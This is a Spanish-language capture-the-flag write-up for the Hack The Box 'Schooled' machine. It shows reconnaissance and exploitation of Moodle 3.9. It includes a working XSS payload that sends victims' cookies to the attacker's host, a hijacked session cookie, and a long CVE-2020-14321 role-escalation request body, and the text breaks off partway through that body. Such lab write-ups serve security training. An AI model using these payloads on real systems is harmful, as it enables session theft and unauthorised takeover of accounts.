---
title: HTB Schooled
date: 2024-04-03 14:10:00 +0800
author: pablo
categories: [HTB, Linux]
tags: [moodle, hashcat, mysql, XSS, VHost Brute Force, CVE-2020-14321]
image:
  path: /assets/img/Schooled/Pasted image 20240331130109.png
---

## Descripción

La intrusión comienza con una serie de exploits para obtener más y más privilegios en una instancia de Moodle, todo ello iniciado por un ataque XSS que permitió obtener la cookie de un usuario. Posteriormente, a través de la suplantación de identidad (impersonation), se logra pasar a otro usuario, lo que eventualmente conduce a la carga maliciosa de un plugin que proporciona una shell web. Extraeré algunos hashes de la base de datos y los crackearé para acceder al siguiente usuario. Este usuario puede ejecutar el administrador de paquetes de FreeBSD, pkg, como root, y también puede escribir en el archivo hosts.

---

## Reconocimiento

Se comprueba que la máquina está activa y se determina su sistema operativo a través del script implementado en bash `whichSystem.sh`

```bash
❯ ping -c 1 10.10.10.234
PING 10.10.10.234 (10.10.10.234) 56(84) bytes of data.
64 bytes from 10.10.10.234: icmp_seq=1 ttl=63 time=109 ms

--- 10.10.10.234 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 108.937/108.937/108.937/0.000 ms
```

El sistema operativo es una `Linux`

### Nmap

Se va a realizar un escaneo de todos los puertos abiertos en el protocolo TCP a través de `nmap`. Comando: `sudo nmap -p- --open -sS -T4 -vvv -n -Pn <IP> -oG allPorts`
Puertos abiertos son:

```bash
22, 80, 33060
```

Se procede a realizar un análisis de detección de servicios y la identificación de versiones utilizando los puertos abiertos encontrados.
Comando: `nmap -sCV -p<Ports Open> <IP> -oN targeted`

```bash
## Nmap 7.94 scan initiated Mon Mar 18 15:32:47 2024 as: nmap -sCV -p22,80,33060 -oN targeted 10.10.10.234
Nmap scan report for 10.10.10.234
Host is up (0.11s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
| ssh-hostkey:
|   2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA)
|   256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA)
|_  256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519)
80/tcp    open  http    Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)
|_http-title: Schooled - A new kind of educational institute
|_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15
| http-methods:
|_  Potentially risky methods: TRACE
33060/tcp open  mysqlx?
| fingerprint-strings:
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
|     Invalid message"
|     HY000
|   LDAPBindReq:
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns:
|     Invalid message-frame."
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94%I=7%D=3/18%Time=65F8A4F6%P=x86_64-pc-linux-gnu%r(N
SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOp
SF:tions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVers
SF:ionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2
SF:B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fI
SF:nvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")
SF:%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01
SF:\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCookie
SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"
SF:\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\
SF:x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY0
SF:00")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01\
SF:x08\x01\x10\x88'\x1a\*Parse\x20error\x20unserializing\x20protobuf\x20me
SF:ssage\"\x05HY000")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LAN
SF:Desk-RC,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\
SF:0\x0b\x08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRP
SF:C,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x
SF:0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,32,"
SF:\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Invalid
SF:\x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10
SF:\x88'\x1a\x0fInvalid\x20message\"\x05HY000");
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
## Nmap done at Mon Mar 18 15:33:14 2024 -- 1 IP address (1 host up) scanned in 26.82 seconds
```

### Web

Se procede con una enumeración de directorios:

```bash
❯ gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.234/ --no-error --add-slash -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.234/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images/              (Status: 200) [Size: 2440]
/css/                 (Status: 200) [Size: 1048]
/js/                  (Status: 200) [Size: 522]
/fonts/               (Status: 200) [Size: 838]
Progress: 31175 / 441122 (7.07%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 31215 / 441122 (7.08%)
===============================================================
Finished
===============================================================
```

#### Enumeración de subdominios

- Enumeración de subdominios a través de `wfuzz`

```bash
❯ wfuzz -c --hl=461 -t 200 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.schooled.htb" http://schooled.htb
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://schooled.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000162:   200        1 L      5 W        84 Ch       "moodle"

Total time: 35.86216
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 139.1159
```

Encontrando el subdirectorio `moodle.schooled.htb`

- Tambien se lo podría realizar a través de `gobuster`

```bash
❯ gobuster vhost -u http://schooled.htb/ -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 200 --append-domain
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://schooled.htb/
[+] Method:          GET
[+] Threads:         200
[+] Wordlist:        /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: moodle.schooled.htb Status: 200 [Size: 84]
```

Las rutas encontradas deberían ser agregadas al archivo `/etc/hosts`.
A través de:

```bash
echo "10.10.10.234 moodle.schooled.htb" | sudo tee -a /etc/hosts
```

## Análisis de vulnerabilidades

Visitando la página web se tiene:
![Untitled](/assets/img/Schooled/Pasted image 20240330135819.png)
Al parecer está corriendo una versión de `moodle`

> Moodle es un sistema de gestión de aprendizaje, gratuito y de código abierto escrito en PHP​​ y distribuido bajo la Licencia Pública General GNU.​​ [Wikipedia](https://es.wikipedia.org/wiki/Moodle)

Accedemos a un panel de registro y procedemos a registrarnos en el servicio Moodle.

```bash
test:P@$$w0rd!123
```

Enumerando el servicio web se nos permite unirnos a la clase de `Matehmatics`

![Untitled](/assets/img/Schooled/Pasted image 20240330141230.png)

En la sección de anuncios se tiene el siguiente mensaje:

![Untitled](/assets/img/Schooled/Pasted image 20240330141342.png)

Se procede a editar nuestro perfil

En la sección `Moodle Net Profile` probando si existe la vulnerabilidad de `XSS`

![Untitled](/assets/img/Schooled/Pasted image 20240330140640.png)

Obteniendo:

![Untitled](/assets/img/Schooled/Pasted image 20240330140658.png)

Se comprueba que es vulnerable para un ataque de `XSS`

## Explotación de vulnerabilidades

### XSS

Se va a tratar de explotar la vulnerabilidad `XSS` para lo cual en nuestra máquina atacante levantaremos un servidor web con Python el cual estará compartiendo un archivo `pwned.js` el que contendrá:

```bash
var request = new XMLHttpRequest();
request.open('GET', 'http://10.10.14.11/?cookie=' + document.cookie, false);
request.send();
```

Este archivo tiene un contenido en `java script` el cual tiene instrucciones para obtener la cookie del usuario que lo ejecute

En el campo `Moodle Net Profile`

`<script src="http://10.10.14.11/pwned.js"></script>`

![Untitled](/assets/img/Schooled/Pasted image 20240318172845.png)

Obteniendo:

![Untitled](/assets/img/Schooled/Pasted image 20240318172928.png)

Se obtiene una `cookie` se procede a guardar en nuestro navegador para verificar si se puede ganar acceso como otro usuario:

```bash
##Cookie Manuel Phillips
cookie=MoodleSession=d97ffqp8fl8f0rakl900qp5bh9
```

Obteniendo:

![Untitled](/assets/img/Schooled/Pasted image 20240318173413.png)

Se gana acceso como el usuario `Manuel Philips`

Se procede a seguir enumerando el servicio

Revisando versión → Github → `http://moodle.schooled.htb/moodle/theme/upgrade.txt`

![Untitled](/assets/img/Schooled/Pasted image 20240318174028.png)

Buscando por la fecha de `moodle 3.9` para luego proceder con la búsqueda de vulnerabilidades que dispone esta versión:

![Untitled](/assets/img/Schooled/Pasted image 20240318175518.png)

Ahora se procede a buscar por vulnerabilidades de `moodle 3.9`

[Security announcements | Moodle.org](https://moodle.org/security/index.php?o=3&p=14)

![Untitled](/assets/img/Schooled/Pasted image 20240318180031.png)

Obteniendo: `CVE-2020-14321`

Se procede a buscar por vulnerabilidades correspondientes a este `CVE`

Vamos a tratarnos de convertir en `Lianne Carter`, ya que este usuario dispone del puesto de `Manager`

![Untitled](/assets/img/Schooled/Pasted image 20240318181337.png)

Dirigiéndonos a:

![Untitled](/assets/img/Schooled/Pasted image 20240318181722.png)

Se ha interceptado la petición con `BurpSuite`

![Untitled](/assets/img/Schooled/Pasted image 20240318182053.png)

Se va a cambiar los campos de: `userlist%5B%5D` y `roletoassign`

![Untitled](/assets/img/Schooled/Pasted image 20240318182338.png)

Para el usuario `Manuel Phillips` corresponde el `id=24`

![Untitled](/assets/img/Schooled/Pasted image 20240318181029.png)

y se sospecha que para un usuario administrador el `roletoassign=1`

Cambiando la data

![Untitled](/assets/img/Schooled/Pasted image 20240318182441.png)

Agregando nuevamente al usuario `Lianne Carter`se habrá activado la opción de `Longin as` para poder cambiar a este usuario

![Untitled](/assets/img/Schooled/Pasted image 20240318182650.png)

Actualmente somos el usuario `Lianne Carter` la cual posee una sección de `Site administration` :
![Untitled](/assets/img/Schooled/Pasted image 20240318182739.png)

La idea para obtener una consola es en la sección de Plug-ins cargar un plugin el cual nos permita obtener una reverse Shell a nuestra máquina atacante!

![Untitled](/assets/img/Schooled/Pasted image 20240318183446.png)

Inspeccionando la página no se dispone de la opción de cargar los plugins

Revisando [GitHub - HoangKien1020/CVE-2020-14321: Course enrolments allowed privilege escalation from teacher role into manager role to RCE](https://github.com/HoangKien1020/CVE-2020-14321)

Nos está proporcionando un payload

Dirigiéndonos a: `Dashboard>Site administration>Users>Permissions>Define roles` y seleccionando `Manager`

![Untitled](/assets/img/Schooled/Pasted image 20240330151310.png)

![Untitled](/assets/img/Schooled/Pasted image 20240330151558.png)|600

Interceptando con `BurpSuite`

![Untitled](/assets/img/Schooled/Pasted image 20240318184414.png)

Obteniendo:

![Untitled](/assets/img/Schooled/Pasted image 20240330151720.png)

Se procede a editar desde el campo `&return`, ingresando el `payload` proporcionado

Agregando el payload

```bash
return=manage&resettype=none&shortname=manager&name=&description=&archetype=manager&contextlevel10=0&contextlevel10=1&contextlevel30=0&contextlevel30=1&contextlevel40=0&contextlevel40=1&contextlevel50=0&contextlevel50=1&contextlevel70=0&contextlevel70=1&contextlevel80=0&contextlevel80=1&allowassign%5B%5D=&allowassign%5B%5D=1&allowassign%5B%5D=2&allowassign%5B%5D=3&allowassign%5B%5D=4&allowassign%5B%5D=5&allowassign%5B%5D=6&allowassign%5B%5D=7&allowassign%5B%5D=8&allowoverride%5B%5D=&allowoverride%5B%5D=1&allowoverride%5B%5D=2&allowoverride%5B%5D=3&allowoverride%5B%5D=4&allowoverride%5B%5D=5&allowoverride%5B%5D=6&allowoverride%5B%5D=7&allowoverride%5B%5D=8&allowswitch%5B%5D=&allowswitch%5B%5D=1&allowswitch%5B%5D=2&allowswitch%5B%5D=3&allowswitch%5B%5D=4&allowswitch%5B%5D=5&allowswitch%5B%5D=6&allowswitch%5B%5D=7&allowswitch%5B%5D=8&allowview%5B%5D=&allowview%5B%5D=1&allowview%5B%5D=2&allowview%5B%5D=3&allowview%5B%5D=4&allowview%5B%5D=5&allowview%5B%5D=6&allowview%5B%5D=7&allowview%5B%5D=8&block%2Fadmin_bookmarks%3Amyaddinstance=1&block%2Fbadges%3Amyaddinstance=1&block%2Fcalendar_month%3Amyaddinstance=1&block%2Fcalendar_upcoming%3Amyaddinstance=1&block%2Fcomments%3Amyaddinstance=1&block%2Fcourse_list%3Amyaddinstance=1&block%2Fglobalsearch%3Amyaddinstance=1&block%2Fglossary_random%3Amyaddinstance=1&block%2Fhtml%3Amyaddinstance=1&block%2Flp%3Aaddinstance=1&block%2Flp%3Amyaddinstance=1&block%2Fmentees%3Amyaddinstance=1&block%2Fmnet_hosts%3Amyaddinstance=1&block%2Fmyoverview%3Amyaddinstance=1&block%2Fmyprofile%3Amyaddinstance=1&block%2Fnavigation%3Amyaddinstance=1&block%2Fnews_items%3Amyaddinstance=1&block%2Fonline_users%3Amyaddinstance=1&block%2Fprivate_files%3Amyaddinstance=1&block%2Frecentlyaccessedcourses%3Amyaddinstance=1&block%2Frecentlyaccesseditems%3Amyaddinstance=1&block%2Frss_client%3Amyaddinstance=1&block%2Fsettings%3Amyaddinstance=1&block%2Fstarredcourses%3Amyaddinstance=1&block%2Ftags%3Amyaddinstance=1&block%2Ftimeline%3Amyaddinstance=1&enrol%2Fcategory%3Asynchronised=1&message%2Fairnotifier%3Amanagedevice=1&moodle%2Fanalytics%3Alistowninsights=1&moodle%2Fanalytics%3Amanagemodels=1&moodle%2Fbadges%3Amanageglobalsettings=1&moodle%2Fblog%3Acreate=1&moodle%2Fblog%3Amanageentries=1&moodle%2Fblog%3Amanageexternal=1&moodle%2Fblog%3Asearch=1&moodle%2Fblog%3Aview=1&moodle%2Fblog%3Aviewdrafts=1&moodle%2Fcourse%3Aconfigurecustomfields=1&moodle%2Fcourse%3Arecommendactivity=1&moodle%2Fgrade%3Amanagesharedforms=1&moodle%2Fgrade%3Asharegradingforms=1&moodle%2Fmy%3Aconfigsyspages=1&moodle%2Fmy%3Amanageblocks=1&moodle%2Fportfolio%3Aexport=1&moodle%2Fquestion%3Aconfig=1&moodle%2Frestore%3Acreateuser=1&moodle%2Frole%3Amanage=1&moodle%2Fsearch%3Aquery=1&moodle%2Fsite%3Aconfig=1&moodle%2Fsite%3Aconfigview=1&moodle%2Fsite%3Adeleteanymessage=1&moodle%2Fsite%3Adeleteownmessage=1&moodle%2Fsite%3Adoclinks=1&moodle%2Fsite%3Aforcelanguage=1&moodle%2Fsite%3Amaintenanceaccess=1&moodle%2Fsite%3Amanageallmessaging=1&moodle%2Fsite%3Amessageanyuser=1&moodle%2Fsite%3Amnetlogintoremote=1&moodle%2Fsite%3Areadallmessages=1&moodle%2Fsite%3Asendmessage=1&moodle%2Fsite%3Auploadusers=1&moodle%2Fsite%3Aviewparticipants=1&moodle%2Ftag%3Aedit=1&moodle%2Ftag%3Aeditblocks=1&moodle%2Ftag%3Aflag=1&moodle%2Ftag%3Amanage=1&moodle%2Fuser%3Achangeownpassword=1&moodle%2Fuser%3Acreate=1&moodle%2Fuser%3Adelete=1&moodle%2Fuser%3Aeditownmessageprofile=1&moodle%2Fuser%3Aeditownprofile=1&moodle%2Fuser%3Aignoreuserquota=1&moodle%2Fuser%3Amanageownblocks=1&moodle%2Fuser%3Amanageownfiles=1&moodle%2Fuser%3Amanagesyspages=1&moodle%2Fuser%3Aupdate=1&moodle%2Fwebservice%3Acreatemobiletoken=1&moodle%2Fwebservice%3Acreatetoken=1&moodle%2Fwebservice%3Amanagealltokens=1&quizaccess%2Fseb%3Amanagetemplates=1&report%2Fcourseoverview%3Aview=1&report%2Fperformance%3Aview=1&report%2Fquestioninstances%3Aview=1&report%2Fsecurity%3Aview=1&report%2Fstatus%3Aview=1&tool%2Fcustomlang%3Aedit=1&tool%2Fcustomlang%3Aview=1&tool%2Fdataprivacy%3Amanagedataregistry=1&tool%2Fdataprivacy%3Amanagedatarequests=1&tool%2Fdataprivacy%3Arequestdeleteforotheruser=1&tool%2Flpmigrate%3Aframeworksmigrate=1&tool%2Fmonitor%3Amanagetool=1&tool%2Fpolicy%3Aaccept=1&tool%2Fpolicy%3Amanagedocs=1&tool%2Fpolicy%3Aviewacceptances=1&tool%2Fuploaduser%3Auploaduserpictures=1&tool%2Fusertours%3Amanagetours=1&auth%2Foauth2%3Amanagelinkedlogins=1&moodle%2Fbadges%3Amanageownbadges=1&moodle%2Fbadges%3Aviewotherbadges=1&moodle%2Fcompetency%3Aevidencedelete=1&moodle%2Fcompetency%3Aplancomment=1&moodle%2Fcompetency%3Aplancommentown=1&moodle%2Fcompetency%3Aplanmanage=1&moodle%2Fcompetency%3Aplanmanagedraft=1&moodle%2Fcompetency%3Aplanmanageown=1&moodle%2Fcompetency%3Aplanmanageowndraft=1&moodle%2Fcompetency%3Aplanrequestreview=1&moodle%2Fcompetency%3Aplanrequestreviewown=1&moodle%2Fcompetency%3Aplanreview=1&moodle%2Fcompetency%3Aplanview=1&moodle%2Fcompetency%3Aplanviewdraft=1&moodle%2Fcompetency%3Aplanviewown=1&moodle%2Fcompetency%3Aplanviewowndraft=1&moodle%2Fcompetency%3Ausercompetencycomment=1&moodle%2Fcompetency%3Ausercompetencycommentown=1&moodle%2Fcompetency%3Ausercompetencyrequestreview=1&moodle%2Fcompetency%3Ausercompetencyrequestreviewown=1&moodle%2Fcompetency%3Ausercompetencyreview=1&moodle%2Fcompetency%3Ausercompetencyview=1&moodle%2Fcompetency%3Auserevidencemanage=1&moodle%2Fcompetency%3Auserevidencemanageown=0&moodle%2Fcompetency%3Auserevidenceview=1&moodle%2Fuser%3Aeditmessageprofile=1&moodle%2Fuser%3Aeditprofile=1&moodle%2Fuser%3Amanageblocks=1&moodle%2Fuser%3Areaduserblogs=1&moodle%2Fuser%3Areaduserposts=1&moodle%2Fuser%3Aviewalldetails=1&moodle%2Fuser%3Aviewlastip=1&moodle%2Fuser%3Aviewuseractivitiesreport=1&report%2Fusersessions%3Amanageownsessions=1&tool%2Fdataprivacy%3Adownloadallrequests=1&tool%2Fdataprivacy%3Adownloadownrequest=1&tool%2Fdataprivacy%3Amakedatadeletionrequestsforchildren=1&tool%2Fdataprivacy%3Amakedatarequestsforchildren=1&tool%2Fdataprivacy%3Arequestdelete=1&tool%2Fpolicy%3Aacceptbehalf=1&moodle%2Fcategory%3Amanage=1&moodle%2Fcategory%3Aviewcourselist=1&moodle%2Fcategory%3Aviewhiddencategories=1&moodle%2Fcohort%3Aassign=1&moodle%2Fcohort%3Amanage=1&moodle%2Fcompetency%3Acompetencymanage=1&moodle%2Fcompetency%3Acompetencyview=1&moodle%2Fcompetency%3Atemplatemanage=1&moodle%2Fcompetency%3Atemplateview=1&moodle%2Fcourse%3Acreate=1&moodle%2Fcourse%3Arequest=1&moodle%2Fsite%3Aapprovecourse=1&repository%2Fcontentbank%3Aaccesscoursecategorycontent=1&repository%2Fcontentbank%3Aaccessgeneralcontent=1&block%2Frecent_activity%3Aviewaddupdatemodule=1&block%2Frecent_activity%3Aviewdeletemodule=1&contenttype%2Fh5p%3Aaccess=1&contenttype%2Fh5p%3Aupload=1&contenttype%2Fh5p%3Auseeditor=1&enrol%2Fcategory%3Aconfig=1&enrol%2Fcohort%3Aconfig=1&enrol%2Fcohort%3Aunenrol=1&enrol%2Fdatabase%3Aconfig=1&enrol%2Fdatabase%3Aunenrol=1&enrol%2Fflatfile%3Amanage=1&enrol%2Fflatfile%3Aunenrol=1&enrol%2Fguest%3Aconfig=1&enrol%2Fimsenterprise%3Aconfig=1&enrol%2Fldap%3Amanage=1&enrol%2Flti%3Aconfig=1&enrol%2Flti%3Aunenrol=1&enrol%2Fmanual%3Aconfig=1&enrol%2Fmanual%3Aenrol=1&enrol%2Fmanual%3Amanage=1&enrol%2Fmanual%3Aunenrol=1&enrol%2Fmanual%3Aunenrolself=1&enrol%2Fmeta%3Aconfig=1&enrol%2Fmeta%3Aselectaslinked=1&enrol%2Fmeta%3Aunenrol=1&enrol%2Fmnet%3Aconfig=1&enrol%2Fpaypal%3Aconfig=1&enrol%2Fpaypal%3Amanage=1&enrol%2Fpaypal%3Aunenrol=1&enrol%2Fpaypal%3Aunenrolself=1&enrol%2Fself%3Aconfig=1&enrol%2Fself%3Aholdkey=1&enrol%2Fself%3Amanage=1&enrol%2Fself%3Aunenrol=1&enrol%2Fself%3Aunenrolself=1&gradeexport%2Fods%3Apublish=1&gradeexport%2Fods%3Aview=1&gradeexport%2Ftxt%3Apublish=1&gradeexport%2Ftxt%3Aview=1&gradeexport%2Fxls%3Apublish=1&gradeexport%2Fxls%3Aview=1&gradeexport%2Fxml%3Apublish=1&gradeexport%2Fxml%3Aview=1&gradeimport%2Fcsv%3Aview=1&gradeimport%2Fdirect%3Aview=1&gradeimport%2Fxml%3Apublish=1&gradeimport%2Fxml%3Aview=1&gradereport%2Fgrader%3Aview=1&gradereport%2Fhistory%3Aview=1&gradereport%2Foutcomes%3Aview=1&gradereport%2Foverview%3Aview=1&gradereport%2Fsingleview%3Aview=1&gradereport%2Fuser%3Aview=1&mod%2Fassign%3Aaddinstance=1&mod%2Fassignment%3Aaddinstance=1&mod%2Fbook%3Aaddinstance=1&mod%2Fchat%3Aaddinstance=1&mod%2Fchoice%3Aaddinstance=1&mod%2Fdata%3Aaddinstance=1&mod%2Ffeedback%3Aaddinstance=1&mod%2Ffolder%3Aaddinstance=1&mod%2Fforum%3Aaddinstance=1&mod%2Fglossary%3Aaddinstance=1&mod%2Fh5pactivity%3Aaddinstance=1&mod%2Fimscp%3Aaddinstance=1&mod%2Flabel%3Aaddinstance=1&mod%2Flesson%3Aaddinstance=1&mod%2Flti%3Aaddcoursetool=1&mod%2Flti%3Aaddinstance=1&mod%2Flti%3Aaddmanualinstance=1&mod%2Flti%3Aaddpreconfiguredinstance=1&mod%2Flti%3Arequesttooladd=1&mod%2Fpage%3Aaddinstance=1&mod%2Fquiz%3Aaddinstance=1&mod%2Fresource%3Aaddinstance=1&mod%2Fscorm%3Aaddinstance=1&mod%2Fsurvey%3Aaddinstance=1&mod%2Furl%3Aaddinstance=1&mod%2Fwiki%3Aaddinstance=1&mod%2Fworkshop%3Aaddinstance=1&moodle%2Fanalytics%3Alistinsights=1&moodle%2Fbackup%3Aanonymise=1&moodle%2Fbackup%3Abackupcourse=1&moodle%2Fbackup%3Abackupsection=1&moodle%2Fbackup%3Abackuptargetimport=1&moodle%2Fbackup%3Aconfigure=1&moodle%2Fbackup%3Adownloadfile=1&moodle%2Fbackup%3Auserinfo=1&moodle%2Fbadges%3Aawardbadge=1&moodle%2Fbadges%3Aconfigurecriteria=1&moodle%2Fbadges%3Aconfiguredetails=1&moodle%2Fbadges%3Aconfiguremessages=1&moodle%2Fbadges%3Acreatebadge=1&moodle%2Fbadges%3Adeletebadge=1&moodle%2Fbadges%3Aearnbadge=1&moodle%2Fbadges%3Arevokebadge=1&moodle%2Fbadges%3Aviewawarded=1&moodle%2Fbadges%3Aviewbadges=1&moodle%2Fcalendar%3Amanageentries=1&moodle%2Fcalendar%3Amanagegroupentries=1&moodle%2Fcalendar%3Amanageownentries=1&moodle%2Fcohort%3Aview=1&moodle%2Fcomment%3Adelete=1&moodle%2Fcomment%3Apost=1&moodle%2Fcomment%3Aview=1&moodle%2Fcompetency%3Acompetencygrade=1&moodle%2Fcompetency%3Acoursecompetencygradable=1&moodle%2Fcompetency%3Acoursecompetencymanage=1&moodle%2Fcompetency%3Acoursecompetencyview=1&moodle%2Fcontentbank%3Aaccess=1&moodle%2Fcontentbank%3Adeleteanycontent=1&moodle%2Fcontentbank%3Adeleteowncontent=1&moodle%2Fcontentbank%3Amanageanycontent=1&moodle%2Fcontentbank%3Amanageowncontent=1&moodle%2Fcontentbank%3Aupload=1&moodle%2Fcontentbank%3Auseeditor=1&moodle%2Fcourse%3Abulkmessaging=1&moodle%2Fcourse%3Achangecategory=1&moodle%2Fcourse%3Achangefullname=1&moodle%2Fcourse%3Achangeidnumber=1&moodle%2Fcourse%3Achangelockedcustomfields=1&moodle%2Fcourse%3Achangeshortname=1&moodle%2Fcourse%3Achangesummary=1&moodle%2Fcourse%3Acreategroupconversations=1&moodle%2Fcourse%3Adelete=1&moodle%2Fcourse%3Aenrolconfig=1&moodle%2Fcourse%3Aenrolreview=1&moodle%2Fcourse%3Aignorefilesizelimits=1&moodle%2Fcourse%3Aisincompletionreports=1&moodle%2Fcourse%3Amanagefiles=1&moodle%2Fcourse%3Amanagegroups=1&moodle%2Fcourse%3Amanagescales=1&moodle%2Fcourse%3Amarkcomplete=1&moodle%2Fcourse%3Amovesections=1&moodle%2Fcourse%3Aoverridecompletion=1&moodle%2Fcourse%3Arenameroles=1&moodle%2Fcourse%3Areset=1&moodle%2Fcourse%3Areviewotherusers=1&moodle%2Fcourse%3Asectionvisibility=1&moodle%2Fcourse%3Asetcurrentsection=1&moodle%2Fcourse%3Asetforcedlanguage=1&moodle%2Fcourse%3Atag=1&moodle%2Fcourse%3Aupdate=1&moodle%2Fcourse%3Auseremail=1&moodle%2Fcourse%3Aview=1&moodle%2Fcourse%3Aviewhiddencourses=1&moodle%2Fcourse%3Aviewhiddensections=1&moodle%2Fcourse%3Aviewhiddenuserfields=1&moodle%2Fcourse%3Aviewparticipants=1&moodle%2Fcourse%3Aviewscales=1&moodle%2Fcourse%3Aviewsuspendedusers=1&moodle%2Fcourse%3Avisibility=1&moodle%2Ffilter%3Amanage=1&moodle%2Fgrade%3Aedit=1&moodle%2Fgrade%3Aexport=1&moodle%2Fgrade%3Ahide=1&moodle%2Fgrade%3Aimport=1&moodle%2Fgrade%3Alock=1&moodle%2Fgrade%3Amanage=1&moodle%2Fgrade%3Amanagegradingforms=1&moodle%2Fgrade%3Amanageletters=1&moodle%2Fgrade%3Amanageoutcomes=1&moodle%2Fgrade%3Aunlock=1&moodle%2Fgrade%3Aview=1&moodle%2Fgrade%3Aviewall=1&moodle%2Fgrade%3Aviewhidden=1&moodle%2Fnotes%3Amanage=1&moodle%2Fnotes%3Aview=1&moodle%2Fquestion%3Aadd=1&moodle%2Fquestion%3Aeditall=1&moodle%2Fquestion%3Aeditmine=1&moodle%2Fquestion%3Aflag=1&moodle%2Fquestion%3Amanagecategory=1&moodle%2Fquestion%3Amoveall=1&moodle%2Fquestion%3Amovemine=1&moodle%2Fquestion%3Atagall=1&moodle%2Fquestion%3Atagmine=1&moodle%2Fquestion%3Auseall=1&moodle%2Fquestion%3Ausemine=1&moodle%2Fquestion%3Aviewall=1&moodle%2Fquestion%3Aviewmine=1&moodle%2Frating%3Arate=1&moodle%2Frating%3Aview=1&moodle%2Frating%3Aviewall=1&moodle%2Frating%3Aviewany=1&moodle%2Frestore%3Aconfigure=